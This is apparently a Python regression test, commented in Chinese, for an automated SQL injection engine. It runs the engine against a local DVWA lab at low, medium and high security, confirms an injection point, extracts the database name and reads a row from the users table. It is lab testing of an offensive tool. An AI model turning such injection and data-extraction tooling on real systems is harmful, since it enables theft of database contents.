# -*- coding: utf-8 -*-
"""DVWA 冷启动回归：非 CTFshow、真实 PHP+MySQL 平台的三档验证。

前置：本地 DVWA 已建库（docker run -p 8770:80 vulnerables/web-dvwa +
setup.php 建库）。断言每档：注入点找到 + database() 提取 = dvwa + users
表 dump 含已知管理员行。通过即证明核心引擎在非 CTFshow 平台可用。
"""
import argparse
import sys

sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from autosqli.core.engine import Engine                      # noqa: E402
from autosqli.cli import build_spec                          # noqa: E402

BASE = "http://localhost:8770"
KNOWN_ADMIN = "admin"                                        # users 表已知行


def run_level(security: str) -> bool:
    print(f"\n=== DVWA security = {security} ===", flush=True)
    # medium：POST 表单 + 数字型（真实 DVWA medium 行为）；low/high 走 GET
    if security == "medium":
        url, method, data = f"{BASE}/vulnerabilities/sqli/", "POST", ["id=1", "Submit=Submit"]
    else:
        url, method, data = f"{BASE}/vulnerabilities/sqli/?id=1&Submit=Submit", "GET", None
    args = argparse.Namespace(
        url=url,
        param="", method=method, data=data, cookie=None, stage_url="",
        dvwa="admin:password", security=security, base_value="1", delay=0.0,
        encode="", time_sec=0.0, table_hint="", empty_ok=False,
        flag_re="", max_requests=0, fresh=True, csrf_url="", csrf_re="",
        csrf_field="", waf_sig=None, header=None, raw_body=False,
        body_template="")
    spec = build_spec(args)
    engine = Engine(spec, log=lambda l, m: print(f"  [{l}] {m[:100]}")
                    if l in ("INFO", "ERROR", "WARN") else None)
    report = engine.analyze(scan_waf=False)
    if report.injection is None:
        print(f"[FAIL] {security}: 未发现注入点")
        return False
    print(f"  注入点: 参数 {report.injection.param} 闭合 {report.injection.closure!r} "
          f"列数 {report.injection.column_count}")
    ok_all = True
    for key in ("union", "error", "bool_blind"):
        try:
            oracle = engine.build_oracle(report, key)
        except Exception as e:                          # noqa: BLE001
            print(f"  [{key}] 构造失败: {str(e)[:60]}")
            continue
        if oracle is None:
            continue
        try:
            db = oracle.scalar("database()")
            print(f"  [{key}] database() = {db!r} ({oracle.requests} 请求)")
            if db == "dvwa":
                # users 表 dump 烟测：known admin 行可取回
                t = oracle.scalar("(select user from users limit 1)")
                print(f"  [{key}] users.user[1] = {t!r}")
                return True if key == "union" else ok_all
        except Exception as e:                          # noqa: BLE001
            print(f"  [{key}] 取数失败: {str(e)[:70]}")
            ok_all = False
    return ok_all


def main():
    results = {}
    for sec in ("low", "medium", "high"):
        try:
            results[sec] = run_level(sec)
        except Exception as e:                          # noqa: BLE001
            print(f"[FAIL] {sec}: 异常 {type(e).__name__}: {str(e)[:80]}")
            results[sec] = False
    print("\n== DVWA 冷启动回归 ==")
    for sec, ok in results.items():
        print(f"  {sec:8s} {'PASS' if ok else 'FAIL'}")
    npass = sum(results.values())
    print(f"== {npass}/3 PASS ==")
    return 0 if npass == 3 else 1


if __name__ == "__main__":
    sys.exit(main())
